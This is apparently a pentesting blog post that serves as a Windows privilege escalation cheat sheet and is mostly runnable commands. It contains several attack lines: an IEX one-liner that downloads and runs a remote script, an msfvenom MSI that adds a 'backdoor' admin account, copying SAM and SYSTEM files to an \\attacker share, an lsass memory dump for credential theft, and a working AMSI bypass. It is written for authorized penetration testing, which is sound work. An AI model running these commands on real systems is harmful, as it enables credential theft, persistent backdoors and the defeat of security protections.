---
title: Windows Privilege Escalation Techniques
date: 2025-01-15 10:00:00 +00:00
categories: [windows, privilege-escalation]
tags: [windows, privilege-escalation, pentesting, security]
image:
  path: /assets/img/posts/windows-privesc.png
  alt: Windows Privilege Escalation Techniques
---

# Windows Privilege Escalation Techniques

Privilege escalation is a critical phase in penetration testing where we attempt to gain higher-level permissions on a Windows system. This comprehensive guide covers the most effective techniques and tools for Windows privilege escalation.

## Table of Contents
- [Initial Information Gathering](#initial-information-gathering)
- [Automated Tools](#automated-tools)
- [Service Exploits](#service-exploits)
- [Registry Exploits](#registry-exploits)
- [File Permissions](#file-permissions)
- [Scheduled Tasks](#scheduled-tasks)
- [Passwords and Tokens](#passwords-and-tokens)

## Initial Information Gathering

Before attempting privilege escalation, gather system information:

### System Information
```cmd
systeminfo
whoami /all
whoami /priv
net user %username%
net localgroup administrators
```

### Network Information
```cmd
ipconfig /all
route print
netstat -ano
```

### Running Processes and Services
```cmd
tasklist /svc
sc query
wmic service list brief
```

## Automated Tools

### WinPEAS
```cmd
# Download and run WinPEAS
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
```

### PowerUp
```powershell
# Import PowerUp module
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Windows Exploit Suggester
```bash
# On Kali Linux
python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt
```

## Service Exploits

### Unquoted Service Paths
Look for services with unquoted paths containing spaces:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Service Permissions
Check if you can modify service configurations:

```cmd
# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Users" *
```

### Service Binary Permissions
```cmd
# Check if service binaries are writable
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\temp\permissions.txt
for /f %a in (c:\temp\permissions.txt) do @(icacls "%a" 2>nul | findstr "(M)" | findstr "Everyone\|BUILTIN\|Users")
```

## Registry Exploits

### AlwaysInstallElevated
Check if AlwaysInstallElevated is enabled:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `0x1`, you can install MSI packages as SYSTEM:

```cmd
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### Registry AutoRuns
Check for writable registry autoruns:

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## File Permissions

### DLL Hijacking
Look for missing DLLs in application directories:

```cmd
# Process Monitor (ProcMon) to identify missing DLLs
# Check PATH directories for writable locations
for %%A in ("%path:;=";"%") do ( cmd /c icacls "%%~A" 2>nul | findstr /i "(M)\|(F)" | findstr /i "everyone\|authenticated users\|users" && echo. )
```

### Weak File Permissions
```cmd
# Find writable files and directories
accesschk.exe -uws "Everyone" "C:\Program Files"
dir "C:\Program Files" /s /q | findstr /i "users"
```

## Scheduled Tasks

### View Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
```

### PowerShell Method
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

### Check Task Permissions
```cmd
# Check if you can modify scheduled task files
icacls C:\Windows\System32\Tasks\*
```

## Passwords and Tokens

### Credential Manager
```cmd
cmdkey /list
runas /savecred /user:administrator cmd.exe
```

### SAM and SYSTEM Files
```cmd
# If you have access to backup SAM files
copy C:\Windows\Repair\SAM \\attacker\share\
copy C:\Windows\Repair\SYSTEM \\attacker\share\
```

### Memory Dumps
```cmd
# Look for credentials in memory
procdump.exe -ma lsass.exe lsass.dmp
```

### PowerShell History
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Token Impersonation

### SeImpersonatePrivilege
If you have SeImpersonatePrivilege, use tools like:

- **JuicyPotato** (Windows Server 2016 and earlier)
- **RoguePotato** (Windows 10 / Server 2019)
- **PrintSpoofer** (All Windows versions)

```cmd
# Example with PrintSpoofer
PrintSpoofer.exe -i -c cmd
```

## Kernel Exploits

### Check Windows Version
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Common Kernel Exploits
- **MS16-032** (Windows 7 SP1/2008 R2 SP1)
- **MS17-017** (Windows 7/8/10/2016)
- **CVE-2019-1388** (Windows 7/8/10/2016/2019)

## Detection and Evasion

### Anti-Virus Evasion
```powershell
# Check AV status
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
```

### AMSI Bypass (PowerShell)
```powershell
# AMSI Bypass example
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Best Practices

1. **Always gather system information first**
2. **Use automated tools for initial reconnaissance**
3. **Verify exploits in isolated environments first**
4. **Document all findings for reporting**
5. **Clean up artifacts after testing**

## Useful Resources

- [LOLBAS Project](https://lolbas-project.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Windows Privilege Escalation Guide](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)

Remember to always test these techniques in authorized environments only. Privilege escalation should only be performed during legitimate penetration testing engagements with proper authorization.

---

*Stay ethical, stay secure.*
